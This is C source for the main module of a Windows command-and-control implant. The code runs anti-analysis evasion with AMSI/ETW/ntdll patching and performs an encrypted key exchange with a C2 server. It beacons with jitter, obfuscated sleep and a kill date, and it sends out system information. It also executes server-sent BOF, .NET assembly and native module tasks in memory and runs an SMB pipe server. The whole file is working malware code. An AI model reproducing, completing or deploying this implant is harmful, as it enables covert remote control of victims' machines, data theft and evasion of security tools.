/*
 * main.c — Agent entry point, initialization, key exchange, and main loop.
 *
 * Flow:
 *   1. Generate UUID agent ID
 *   2. ECDH key exchange (RSA-encrypted initial message)
 *   3. Main loop: check in → receive tasks → execute → send results → sleep
 */
#include "agent.h"
#include "evasion.h"

/* ─── Agent ID generation ─── */

static void generate_agent_id(unsigned char *id_out) {
    /* Seed from high-resolution timer + PID for uniqueness */
    LARGE_INTEGER pc;
    QueryPerformanceCounter(&pc);
    srand((unsigned int)(pc.QuadPart ^ GetCurrentProcessId()));

    /* Use BCrypt random if available, fall back to rand */
    NTSTATUS s = BCryptGenRandom(NULL, id_out, UUID_SIZE,
                                  BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (!NT_SUCCESS(s)) {
        for (int i = 0; i < UUID_SIZE; i++)
            id_out[i] = (unsigned char)(rand() & 0xFF);
    }

    /* Set version 4 UUID bits */
    id_out[6] = (id_out[6] & 0x0F) | 0x40;  /* Version 4 */
    id_out[8] = (id_out[8] & 0x3F) | 0x80;  /* Variant 1 */
}

/* ─── Send task result with chunking ─── */

static BOOL send_result_chunk(AgentState *state, const unsigned char *task_id,
                               const unsigned char *data, DWORD data_len,
                               BOOL success, DWORD chunk_seq, DWORD chunk_total) {
    Buffer res_body;
    buf_init(&res_body, data_len + 128);
    tlv_add_uuid(&res_body, TLV_AGENT_ID, state->agent_id);
    tlv_add_uuid(&res_body, TLV_TASK_ID, task_id);
    tlv_add_uint8(&res_body, TLV_RESULT_STATUS, success ? 0 : 1);
    if (data && data_len > 0)
        tlv_add_raw(&res_body, TLV_RESULT_OUTPUT, data, data_len);
    if (chunk_total > 1) {
        tlv_add_uint32(&res_body, TLV_RESULT_CHUNK_SEQ, chunk_seq);
        tlv_add_uint32(&res_body, TLV_RESULT_CHUNK_TOTAL, chunk_total);
    }

    Buffer res_cmd;
    buf_init(&res_cmd, res_body.len + 16);
    command_pack(&res_cmd, CMD_TASK_RESULT, res_body.data, res_body.len);
    buf_free(&res_body);

    unsigned char res_nonce[NONCE_SIZE];
    make_nonce(state->agent_id, state->nonce_counter, res_nonce);
    state->nonce_counter += 2;

    unsigned char *res_enc = NULL;
    DWORD res_enc_len;
    BOOL ok = FALSE;
    if (aes_gcm_encrypt(state->session_key, res_nonce,
                       res_cmd.data, res_cmd.len,
                       &res_enc, &res_enc_len)) {
        Buffer res_pkt;
        buf_init(&res_pkt, res_enc_len + HEADER_SIZE);
        packet_pack(&res_pkt, res_enc, res_enc_len,
                   state->msg_id++, CONFIG_MAGIC);
        free(res_enc);

        unsigned char *ack = NULL;
        DWORD ack_len;
        ok = channel_send_recv(res_pkt.data, res_pkt.len, &ack, &ack_len);
        if (ack) free(ack);
        buf_free(&res_pkt);
    }
    buf_free(&res_cmd);
    return ok;
}

BOOL send_task_result(AgentState *state, const unsigned char *task_id,
                      const unsigned char *result, DWORD result_len,
                      BOOL success) {
    if (result_len <= CHUNK_SIZE) {
        /* Single chunk — send directly */
        return send_result_chunk(state, task_id, result, result_len,
                                success, 0, 1);
    }

    /* Multi-chunk: split into CHUNK_SIZE pieces */
    DWORD total_chunks = (result_len + CHUNK_SIZE - 1) / CHUNK_SIZE;
    DWORD offset = 0;
    for (DWORD seq = 0; seq < total_chunks; seq++) {
        DWORD chunk_len = result_len - offset;
        if (chunk_len > CHUNK_SIZE) chunk_len = CHUNK_SIZE;

        if (!send_result_chunk(state, task_id, result + offset, chunk_len,
                               success, seq, total_chunks)) {
            return FALSE;
        }
        offset += chunk_len;

        /* Small delay between chunks to avoid overwhelming the channel */
        if (seq < total_chunks - 1) Sleep(100);
    }
    return TRUE;
}

/* ─── Initialization ─── */

BOOL agent_init(AgentState *state) {
    memset(state, 0, sizeof(AgentState));
    state->sleep_ms = CONFIG_SLEEP_MS;
    state->jitter_pct = CONFIG_JITTER_PCT;
    state->running = TRUE;
    state->nonce_counter = 0;  /* Agent uses even counters */
    state->msg_id = 0;

    DBG("[init] agent_init starting, sleep=%d jitter=%d", CONFIG_SLEEP_MS, CONFIG_JITTER_PCT);

    /* Evasion: load-time anti-analysis + run-time patches (AMSI/ETW/ntdll) */
    if (!evasion_init()) {
        DBG("[init] evasion_init FAILED — anti-debug/sandbox triggered, exiting");
        return FALSE;
    }
    DBG("[init] evasion_init OK");

    generate_agent_id(state->agent_id);
    DBG("[init] agent_id generated");

    if (!crypto_init()) {
        DBG("[init] crypto_init FAILED");
        return FALSE;
    }
    DBG("[init] crypto_init OK");

    /* Register and initialize channels */
    channels_register();
    DBG("[init] channels registered, count=%d", g_channel_count);

    if (!channel_init_active()) {
        DBG("[init] channel_init_active FAILED");
        return FALSE;
    }
    DBG("[init] channel_init_active OK (HTTP session created)");

    /* Start SMB pipe server if configured */
    if (CONFIG_PIPE_ENABLED == 1)
        smb_start_pipe_server();

    return TRUE;
}

/* ─── Key exchange ─── */

BOOL agent_key_exchange(AgentState *state) {
    /*
     * 1. Generate ECDH P-256 keypair
     * 2. Build payload: agent_id(16) + ecdh_pub(65) = 81 bytes
     * 3. RSA-OAEP encrypt with server's public key
     * 4. Wrap in packet frame
     * 5. Send via HTTP, receive response
     * 6. Derive session key from ECDH shared secret
     * 7. Decrypt response with session key
     * 8. Verify KEY_EXCHANGE_RESP
     */

    DBG("[kex] key exchange starting");

    /* Step 1: Generate ECDH keypair */
    unsigned char my_pub[ECDH_PUBKEY_SIZE];
    BCRYPT_KEY_HANDLE my_priv = NULL;

    if (!ecdh_generate_keypair(my_pub, &my_priv)) {
        DBG("[kex] ecdh_generate_keypair FAILED");
        return FALSE;
    }
    DBG("[kex] ECDH keypair generated");

    /* Step 2: Build key exchange payload */
    unsigned char kex_payload[UUID_SIZE + ECDH_PUBKEY_SIZE];
    memcpy(kex_payload, state->agent_id, UUID_SIZE);
    memcpy(kex_payload + UUID_SIZE, my_pub, ECDH_PUBKEY_SIZE);

    /* Step 3: RSA encrypt */
    unsigned char *rsa_ct = NULL;
    DWORD rsa_ct_len;
    DBG("[kex] RSA encrypting %u bytes (modulus len=%u)", (unsigned)sizeof(kex_payload), RSA_MODULUS_LEN);
    if (!rsa_encrypt(RSA_MODULUS, RSA_MODULUS_LEN,
                     RSA_EXPONENT, RSA_EXPONENT_LEN,
                     kex_payload, sizeof(kex_payload),
                     &rsa_ct, &rsa_ct_len)) {
        DBG("[kex] rsa_encrypt FAILED");
        ecdh_free_key(my_priv);
        return FALSE;
    }
    DBG("[kex] RSA encrypted, ct_len=%u", rsa_ct_len);

    /* Step 4: Wrap in packet frame */
    Buffer pkt;
    buf_init(&pkt, 512);
    packet_pack(&pkt, rsa_ct, rsa_ct_len, state->msg_id++, CONFIG_MAGIC);
    free(rsa_ct);

    /* Step 5: Send via HTTP */
    unsigned char *resp_raw = NULL;
    DWORD resp_raw_len;
    DBG("[kex] sending packet (%u bytes) via channel", pkt.len);
    BOOL ok = channel_send_recv(pkt.data, pkt.len, &resp_raw, &resp_raw_len);
    buf_free(&pkt);

    if (!ok || !resp_raw) {
        DBG("[kex] channel_send_recv FAILED (ok=%d, resp=%p)", ok, resp_raw);
        ecdh_free_key(my_priv);
        return FALSE;
    }
    DBG("[kex] got response, %u bytes", resp_raw_len);

    /* Step 6: Parse response packet header */
    DWORD magic, size, msg_id;
    if (!packet_unpack_header(resp_raw, resp_raw_len, &magic, &size, &msg_id) ||
        magic != CONFIG_MAGIC) {
        DBG("[kex] packet header invalid (magic=0x%08X, expected=0x%08X)", magic, CONFIG_MAGIC);
        free(resp_raw);
        ecdh_free_key(my_priv);
        return FALSE;
    }
    DBG("[kex] packet header OK, size=%u msg_id=%u", size, msg_id);

    /*
     * Response is encrypted with the session key we haven't derived yet.
     * But the response contains the server's ECDH public key.
     * We need to:
     *   a) Parse the server's pub key from the encrypted response
     *   b) But we can't decrypt without the session key...
     *
     * The server encrypts the response with the session key derived from
     * ECDH(server_priv, agent_pub). The agent derives the same key from
     * ECDH(agent_priv, server_pub). But the server_pub IS in the encrypted
     * response!
     *
     * Resolution: The server could also derive the key first (it has both
     * keys at that point), encrypt the response, and the agent tries all
     * possible session keys... OR we need a different approach.
     *
     * Looking at the Python server code: it derives the session key FIRST
     * from ECDH, then encrypts the response (which contains the server pub
     * key, but the agent doesn't strictly need it to derive the session key
     * — wait, yes it does).
     *
     * Actually the flow is:
     *   Server has: agent_pub (from the request) + server_priv (just generated)
     *   Server derives: session_key = HKDF(ECDH(server_priv, agent_pub), salt=agent_id)
     *   Server sends: Encrypt(session_key, server_pub)
     *
     *   Agent has: agent_priv + server_pub (from the response... which is encrypted)
     *
     * This is a chicken-and-egg problem. BUT: the agent doesn't need the
     * server_pub to be IN the response. It just needs the raw ECDH shared
     * secret, which is the same regardless of who computed it:
     *   ECDH(server_priv, agent_pub) == ECDH(agent_priv, server_pub)
     *
     * So the server needs to send server_pub UNENCRYPTED (or RSA-encrypted).
     * Looking at the Python code again:
     *   resp_plaintext = pack_command(CMD_KEY_EXCHANGE_RESP, server_pub_bytes)
     *   encrypted_resp = aes_gcm.encrypt(session_key, nonce, resp_plaintext)
     *
     * The server encrypts the response with session_key. But the agent
     * can't decrypt without server_pub to derive session_key.
     *
     * SOLUTION: The response must include server_pub in cleartext, OR we
     * modify the protocol so the server sends server_pub RSA-encrypted.
     *
     * For now, let's try a practical approach: the server_pub is included
     * as a prefix before the encrypted data. We'll modify the server to
     * prepend server_pub(65) before the encrypted response.
     *
     * ALTERNATIVE (simpler, no server changes): The agent could try to
     * brute-force... no that's silly.
     *
     * PRACTICAL SOLUTION: Include server_pub in cleartext before the
     * encrypted portion. The packet becomes:
     *   MAGIC(4) + SIZE(4) + MSG_ID(4) + SERVER_PUB(65) + ENCRYPTED
     *
     * But this changes the protocol. Instead, let's have the server
     * encrypt the response with the SAME RSA key exchange approach,
     * or send server_pub in the clear.
     *
     * SIMPLEST FIX: Have the server put the server_pub in the clear as
     * the first 65 bytes of the encrypted_payload field. The agent reads
     * it, derives the session key, then decrypts the rest.
     *
     * For now, we'll implement this with the following convention:
     * The key exchange response payload (after packet header) is:
     *   SERVER_PUB(65) + AES_GCM_ENCRYPTED(CMD + BODY)
     *
     * We need to update the server listener to match. Let's do that.
     */

    /* Parse: HEADER(12) + SERVER_PUB(65) + ENCRYPTED_RESPONSE */
    if (resp_raw_len < HEADER_SIZE + ECDH_PUBKEY_SIZE + NONCE_SIZE + TAG_SIZE) {
        free(resp_raw);
        ecdh_free_key(my_priv);
        return FALSE;
    }

    const unsigned char *server_pub = resp_raw + HEADER_SIZE;
    const unsigned char *encrypted_resp = resp_raw + HEADER_SIZE + ECDH_PUBKEY_SIZE;
    DWORD encrypted_resp_len = resp_raw_len - HEADER_SIZE - ECDH_PUBKEY_SIZE;

    /* Derive shared secret */
    unsigned char shared_secret[32];
    DBG("[kex] deriving ECDH shared secret");
    if (!ecdh_derive_shared_secret(my_priv, server_pub, shared_secret)) {
        DBG("[kex] ecdh_derive_shared_secret FAILED");
        free(resp_raw);
        ecdh_free_key(my_priv);
        return FALSE;
    }
    ecdh_free_key(my_priv);
    DBG("[kex] shared secret derived OK");

    /* Derive session key via HKDF-SHA256 */
    unsigned char hkdf_info[] = {'c'^0x5A,'2'^0x5A,'_'^0x5A,'s'^0x5A,'e'^0x5A,
                                  's'^0x5A,'s'^0x5A,'i'^0x5A,'o'^0x5A,'n'^0x5A};
    for (int _hi = 0; _hi < 10; _hi++) hkdf_info[_hi] ^= 0x5A;
    if (!hkdf_sha256(shared_secret, 32,
                     state->agent_id, UUID_SIZE,
                     hkdf_info, 10,
                     state->session_key, KEY_SIZE)) {
        SecureZeroMemory(hkdf_info, sizeof(hkdf_info));
        SecureZeroMemory(shared_secret, 32);
        free(resp_raw);
        return FALSE;
    }
    SecureZeroMemory(hkdf_info, sizeof(hkdf_info));
    SecureZeroMemory(shared_secret, 32);
    state->has_session_key = TRUE;
    DBG("[kex] session key derived via HKDF");

    /* Decrypt response to verify */
    unsigned char *resp_pt = NULL;
    DWORD resp_pt_len;
    if (aes_gcm_decrypt(state->session_key, encrypted_resp, encrypted_resp_len,
                        &resp_pt, &resp_pt_len)) {
        DBG("[kex] AES-GCM decrypt OK, pt_len=%u", resp_pt_len);
        /* Parse command — should be KEY_EXCHANGE_RESP */
        BYTE cmd;
        const unsigned char *body;
        DWORD body_len;
        if (command_unpack(resp_pt, resp_pt_len, &cmd, &body, &body_len)) {
            if (cmd != CMD_KEY_EXCHANGE_RESP) {
                DBG("[kex] unexpected cmd=0x%02X (expected KEY_EXCHANGE_RESP)", cmd);
                free(resp_pt);
                free(resp_raw);
                return FALSE;
            }
            DBG("[kex] KEY_EXCHANGE complete — session established!");
        }
        free(resp_pt);
    } else {
        DBG("[kex] AES-GCM decrypt FAILED (enc_len=%u)", encrypted_resp_len);
        free(resp_raw);
        return FALSE;
    }

    free(resp_raw);
    return TRUE;
}

/* ─── Check-in: send sysinfo, receive tasks ─── */

BOOL agent_checkin(AgentState *state) {
    DBG("[checkin] starting checkin");
    if (!state->has_session_key) {
        DBG("[checkin] no session key!");
        return FALSE;
    }

    /* Build check-in TLV body */
    Buffer body;
    buf_init(&body, 1024);
    tlv_add_uuid(&body, TLV_AGENT_ID, state->agent_id);
    sysinfo_collect(&body);

    /* Pack command */
    Buffer cmd;
    buf_init(&cmd, body.len + 16);
    command_pack(&cmd, CMD_CHECKIN_REQUEST, body.data, body.len);
    buf_free(&body);

    /* Encrypt */
    unsigned char nonce[NONCE_SIZE];
    make_nonce(state->agent_id, state->nonce_counter, nonce);
    state->nonce_counter += 2;  /* Agent uses even */

    unsigned char *encrypted = NULL;
    DWORD enc_len;
    if (!aes_gcm_encrypt(state->session_key, nonce,
                         cmd.data, cmd.len, &encrypted, &enc_len)) {
        buf_free(&cmd);
        return FALSE;
    }
    buf_free(&cmd);

    /* Frame packet */
    Buffer pkt;
    buf_init(&pkt, enc_len + HEADER_SIZE);
    packet_pack(&pkt, encrypted, enc_len, state->msg_id++, CONFIG_MAGIC);
    free(encrypted);

    /* Send and receive */
    unsigned char *resp_raw = NULL;
    DWORD resp_raw_len;
    BOOL ok = channel_send_recv(pkt.data, pkt.len, &resp_raw, &resp_raw_len);
    buf_free(&pkt);

    if (!ok || !resp_raw) {
        DBG("[checkin] send_recv FAILED");
        return FALSE;
    }
    DBG("[checkin] got response %u bytes", resp_raw_len);

    /* Parse response */
    DWORD magic, size, msg_id;
    if (!packet_unpack_header(resp_raw, resp_raw_len, &magic, &size, &msg_id) ||
        magic != CONFIG_MAGIC) {
        DBG("[checkin] bad packet header");
        free(resp_raw);
        return FALSE;
    }

    /* Decrypt */
    const unsigned char *enc_payload = resp_raw + HEADER_SIZE;
    DWORD enc_payload_len = resp_raw_len - HEADER_SIZE;

    unsigned char *plaintext = NULL;
    DWORD pt_len;
    if (!aes_gcm_decrypt(state->session_key, enc_payload, enc_payload_len,
                         &plaintext, &pt_len)) {
        DBG("[checkin] decrypt FAILED");
        free(resp_raw);
        return FALSE;
    }
    DBG("[checkin] decrypt OK, processing tasks");
    free(resp_raw);

    /* Parse command */
    BYTE resp_cmd;
    const unsigned char *resp_body;
    DWORD resp_body_len;
    if (!command_unpack(plaintext, pt_len, &resp_cmd, &resp_body, &resp_body_len) ||
        resp_cmd != CMD_CHECKIN_RESPONSE) {
        free(plaintext);
        return FALSE;
    }

    /* Parse tasks from response TLVs */
    DWORD offset = 0;
    TlvEntry entry;
    Task current_task;
    memset(&current_task, 0, sizeof(current_task));
    BOOL in_task = FALSE;
    int task_count = 0;
    int tlv_count = 0;

    DBG("[checkin] parsing TLVs from body (%u bytes)", resp_body_len);

    while (tlv_iter(resp_body, resp_body_len, &offset, &entry)) {
        tlv_count++;
        DBG("[checkin] TLV #%d: type=0x%04X len=%u", tlv_count, entry.type, entry.length);

        switch (entry.type) {
            case TLV_TASK_ID:
                /* If we were building a previous task, execute it first */
                if (in_task) {
                    task_count++;

                    /* Check for EXIT in mid-queue position */
                    if (current_task.task_type == TASK_EXIT) {
                        DBG("[task] EXIT task received (mid-queue) — shutting down");
                        state->running = FALSE;
                        free(plaintext);
                        return TRUE;
                    }

                    DBG("[task] executing queued task #%d: type=0x%02X module='%s' args_len=%u",
                        task_count, current_task.task_type, current_task.module_name,
                        current_task.arguments_len);

                    unsigned char *result = NULL;
                    DWORD result_len = 0;
                    BOOL success = FALSE;

                    if (current_task.task_type == TASK_BOF) {
                        DBG("[task] dispatching as BOF");
                        success = coff_load_and_execute(
                            current_task.payload, current_task.payload_len,
                            current_task.arguments, current_task.arguments_len,
                            &result, &result_len);
                    } else if (current_task.task_type == TASK_ASSEMBLY) {
                        DBG("[task] dispatching as ASSEMBLY");
                        const char *asm_args = NULL;
                        if (current_task.arguments && current_task.arguments_len > 0) {
                            asm_args = (const char *)current_task.arguments;
                        }
                        success = assembly_load_and_execute(
                            current_task.payload, current_task.payload_len,
                            asm_args, &result, &result_len);
                    } else {
                        DBG("[task] dispatching as NATIVE module '%s'", current_task.module_name);
                        success = module_execute(current_task.module_name,
                                                  current_task.arguments,
                                                  current_task.arguments_len,
                                                  &result, &result_len);
                    }
                    DBG("[task] execution done: success=%d result_len=%u", success, result_len);

                    BOOL send_ok = send_task_result(state, current_task.task_id,
                                    result, result_len, success);
                    DBG("[task] send_task_result: %s", send_ok ? "OK" : "FAILED");
                    if (result) free(result);
                }

                /* Start new task */
                memset(&current_task, 0, sizeof(current_task));
                if (entry.length >= UUID_SIZE)
                    memcpy(current_task.task_id, entry.value, UUID_SIZE);
                in_task = TRUE;
                break;

            case TLV_TASK_TYPE:
                if (entry.length >= 1) {
                    current_task.task_type = entry.value[0];
                    DBG("[checkin] task_type=0x%02X", current_task.task_type);
                }
                break;

            case TLV_MODULE_NAME:
                if (entry.length > 0 && entry.length < sizeof(current_task.module_name)) {
                    memcpy(current_task.module_name, entry.value, entry.length);
                    current_task.module_name[entry.length] = '\0';
                    DBG("[checkin] module_name='%s'", current_task.module_name);
                }
                break;

            case TLV_TASK_PAYLOAD:
                current_task.payload = (unsigned char *)entry.value;
                current_task.payload_len = entry.length;
                DBG("[checkin] payload_len=%u", entry.length);
                break;

            case TLV_TASK_ARGUMENTS:
                current_task.arguments = (unsigned char *)entry.value;
                current_task.arguments_len = entry.length;
                DBG("[checkin] arguments_len=%u", entry.length);
                break;

            case TLV_TASK_TIMEOUT:
                if (entry.length >= 4)
                    memcpy(&current_task.timeout, entry.value, 4);
                break;
        }

        /* Handle config changes */
        if (entry.type == TLV_CONFIG_SLEEP && entry.length >= 4) {
            DWORD new_sleep;
            memcpy(&new_sleep, entry.value, 4);
            state->sleep_ms = (int)new_sleep;
            DBG("[checkin] sleep updated to %u ms", new_sleep);
        }
        if (entry.type == TLV_CONFIG_JITTER && entry.length >= 1) {
            state->jitter_pct = entry.value[0];
            DBG("[checkin] jitter updated to %u%%", entry.value[0]);
        }
    }

    DBG("[checkin] TLV parsing done: %d TLVs, in_task=%d", tlv_count, in_task);

    /* Execute last task if any */
    if (in_task) {
        task_count++;

        /* Check for EXIT task */
        if (current_task.task_type == TASK_EXIT) {
            DBG("[task] EXIT task received — shutting down");
            state->running = FALSE;
            free(plaintext);
            return TRUE;
        }

        DBG("[task] executing final task #%d: type=0x%02X module='%s' args_len=%u",
            task_count, current_task.task_type, current_task.module_name,
            current_task.arguments_len);

        if (current_task.task_type == TASK_NATIVE || current_task.task_type == TASK_BOF
            || current_task.task_type == TASK_ASSEMBLY) {
            unsigned char *result = NULL;
            DWORD result_len = 0;
            BOOL success = FALSE;

            if (current_task.task_type == TASK_BOF) {
                DBG("[task] dispatching as BOF");
                success = coff_load_and_execute(
                    current_task.payload, current_task.payload_len,
                    current_task.arguments, current_task.arguments_len,
                    &result, &result_len);
            } else if (current_task.task_type == TASK_ASSEMBLY) {
                DBG("[task] dispatching as ASSEMBLY");
                const char *asm_args = NULL;
                if (current_task.arguments && current_task.arguments_len > 0) {
                    asm_args = (const char *)current_task.arguments;
                }
                success = assembly_load_and_execute(
                    current_task.payload, current_task.payload_len,
                    asm_args, &result, &result_len);
            } else {
                DBG("[task] dispatching as NATIVE module '%s'", current_task.module_name);
                success = module_execute(current_task.module_name,
                                          current_task.arguments,
                                          current_task.arguments_len,
                                          &result, &result_len);
            }

            DBG("[task] execution done: success=%d result_len=%u", success, result_len);

            BOOL send_ok = send_task_result(state, current_task.task_id,
                            result, result_len, success);
            DBG("[task] send_task_result: %s", send_ok ? "OK" : "FAILED");
            if (result) free(result);
        } else {
            DBG("[task] unknown task_type=0x%02X, skipping", current_task.task_type);
        }
    }

    free(plaintext);
    return TRUE;
}

/* ─── Main loop ─── */

void agent_run(AgentState *state) {
    while (state->running) {
        /* Kill date check */
        if (CONFIG_KILL_DATE > 0) {
            time_t now = time(NULL);
            if (now > (time_t)CONFIG_KILL_DATE) {
                state->running = FALSE;
                break;
            }
        }

        /* Check in (with channel fallback on failure) */
        if (!agent_checkin(state)) {
            if (!channel_try_fallback()) {
                /* All channels exhausted — extended sleep */
                evasion_sleep_obfuscated(3600000); /* 1 hour */
            }
        }

        /* Exit immediately if checkin received EXIT task */
        if (!state->running) break;

        /* Sleep with jitter */
        int jitter = 0;
        if (state->jitter_pct > 0 && state->sleep_ms > 0) {
            int max_jitter = state->sleep_ms * state->jitter_pct / 100;
            jitter = (rand() % (2 * max_jitter + 1)) - max_jitter;
        }
        int sleep_time = state->sleep_ms + jitter;
        if (sleep_time < 1000) sleep_time = 1000;
        evasion_sleep_obfuscated((DWORD)sleep_time);
    }
}

/* ─── Entry point ─── */

int main(void) {
    AgentState state;

    DBG("[main] agent starting, PID=%u", GetCurrentProcessId());

    if (!agent_init(&state)) {
        DBG("[main] agent_init FAILED — exiting");
        return 1;
    }
    DBG("[main] agent_init OK, starting key exchange");

    /* Key exchange with retry */
    int retries = 0;
    while (!agent_key_exchange(&state)) {
        retries++;
        DBG("[main] key exchange attempt %d FAILED", retries);
        if (retries > 10) {
            DBG("[main] giving up after %d key exchange attempts", retries);
            crypto_cleanup();
            http_cleanup();
            return 1;
        }
        Sleep(5000 + (rand() % 5000));
    }
    DBG("[main] key exchange succeeded, entering main loop");

    /* Main beacon loop */
    agent_run(&state);

    /* Cleanup */
    SecureZeroMemory(&state.session_key, KEY_SIZE);
    smb_stop_pipe_server();
    channel_cleanup_all();
    crypto_cleanup();
    return 0;
}
